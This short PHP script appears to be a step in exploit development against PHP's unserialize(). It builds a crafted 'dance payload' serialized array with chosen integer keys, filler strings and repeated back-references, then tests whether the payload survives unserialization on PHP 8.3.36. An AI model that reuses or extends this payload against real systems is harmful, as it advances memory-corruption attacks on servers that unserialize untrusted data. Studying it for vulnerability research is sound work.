<?php
// fa_dance_alone.php — top-level dance unserialize (no re-entry): does the
// a:127 dance payload itself survive on 8.3.36?
$d  = 'i:129;i:5;';
$d .= 'i:1028;i:1;';
$d .= 'i:8;s:8:"AAAAAAAA";';
$d .= 'i:10;i:1;';
$d .= 'i:12;s:8:"BBBBBBBB";';
for ($m = 5; $m <= 61; $m++) { $d .= 'i:' . (2*$m+4) . ';i:1;'; }
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256*$j) . ';R:1;'; }
$d .= 'i:16896;i:1;';
$dp = 'a:127:{' . $d . '}';
echo "dance len=", strlen($dp), "\n";
$arr = unserialize($dp);
echo "standalone ok=", var_export($arr !== false, true), " count=", is_array($arr) ? count($arr) : -1, "\n";
echo "arr129=", var_export($arr[129] ?? 'NOKEY', true), "\n";
echo "SCRIPT-END\n";
